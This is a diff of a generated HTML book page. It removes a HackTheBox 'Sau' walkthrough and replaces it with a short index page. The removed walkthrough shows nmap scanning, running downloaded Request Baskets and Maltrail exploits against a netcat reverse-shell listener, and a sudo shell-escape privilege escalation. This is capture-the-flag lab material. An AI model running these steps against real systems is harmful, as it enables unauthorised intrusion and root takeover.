@@ -88,7 +88,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded "><a href="HackTheBox/Machines/Easy/Sau.html" class="active"><strong aria-hidden="true">1.</strong> HackTheBox</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="HackTheBox/Machines/index.html"><strong aria-hidden="true">1.1.</strong> Machines</a></li></ol></li><li class="chapter-item expanded "><a href="CryptoHack/index.html"><strong aria-hidden="true">2.</strong> CryptoHack</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="CryptoHack/Introduction_to_Cryptohack/index.html"><strong aria-hidden="true">2.1.</strong> Introduction_to_Cryptohack</a></li></ol></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded "><a href="HackTheBox/index.html" class="active"><strong aria-hidden="true">1.</strong> HackTheBox</a></li><li class="chapter-item expanded "><a href="CryptoHack/index.html"><strong aria-hidden="true">2.</strong> CryptoHack</a></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
@@ -173,37 +173,15 @@
 
                 <div id="content" class="content">
                     <main>
-                        <p><img src="/Assets/HackTheBox/Machines/Sau.png" alt="Alt" />
-#HackTheBox #Machines #Easy</p>
-<h2 id="scan-port"><a class="header" href="#scan-port">Scan Port</a></h2>
-<pre><code class="language-bash">nmap -sCV -Pn {TARGET IP} -T4
-</code></pre>
-<p>The results, <code>22/tcp</code> <code>80/tcp</code> <code>55555/tcp</code></p>
-<h2 id="connect-to-sau"><a class="header" href="#connect-to-sau">Connect to Sau</a></h2>
-<p>First add new hosts and TARGET IP in <code>/etc/hosts</code>. Open your browser with port 55555, because we can't use on port 80.
-Create new basket, open basket and copy your basket. Search on your browser <code>Request basket exploit</code> and download it. In terminal, type this :</p>
-<pre><code class="language-bash">bash ./CVE-...sh {TARGET IP:PORT} {MY IP:PORT = 127.0.0.1:80}
-
-//ex result
-basket = cuyy123
-</code></pre>
-<p>The results is we're created new basket, open the basket with the token. Let's try paste the url basket on your browser, and see the result. Look, the result is different than before, on footer you can see <code>Matrail v.0.53</code>. So now, search <code>Maltrail v.0.53 exploits</code> and download it.
-Listen the port use <code>nc</code> command</p>
-<pre><code class="language-bash">nc -lvnp 1234
-</code></pre>
-<p>Then, we run the exploit.py are downloaded earlier</p>
-<pre><code class="language-python">python3 exploit.py {IP tun0} {PORT} {TARGET IP:PORT}/cuyy123
-</code></pre>
-<p>RUN IT. Open the listen port, yeah we can connect, soo now we can find the flag. <code>ls</code> for list, <code>cat</code> for execute/read. flag 1 is user.txt on Puma users, just <code>cd ~</code> and <code>ls</code> you can find the flag of user. flag 2 is root.txt on Root directory, <code>sudo -l</code>, copy content of NOPASSWD, <code>sudo ...</code>, use shebang <code>!/bin/sh</code>. Now you're on Root user, <code>ls</code> then <code>cd root</code> then <code>ls</code> again.
-Congratulations the last flag has been found by u hehehe.😁👍
-![[Sau Clear.png]]</p>
+                        <h1 id="hackthebox"><a class="header" href="#hackthebox">HackTheBox</a></h1>
+<p><a href="HackTheBox/Machines/README.html">Machines</a></p>
 
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
 
-                            <a rel="next prefetch" href="HackTheBox/Machines/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                            <a rel="next prefetch" href="CryptoHack/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                 <i class="fa fa-angle-right"></i>
                             </a>
 
@@ -214,7 +192,7 @@ Congratulations the last flag has been found by u hehehe.😁👍
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
 
-                    <a rel="next prefetch" href="HackTheBox/Machines/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                    <a rel="next prefetch" href="CryptoHack/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                         <i class="fa fa-angle-right"></i>
                     </a>
             </nav>
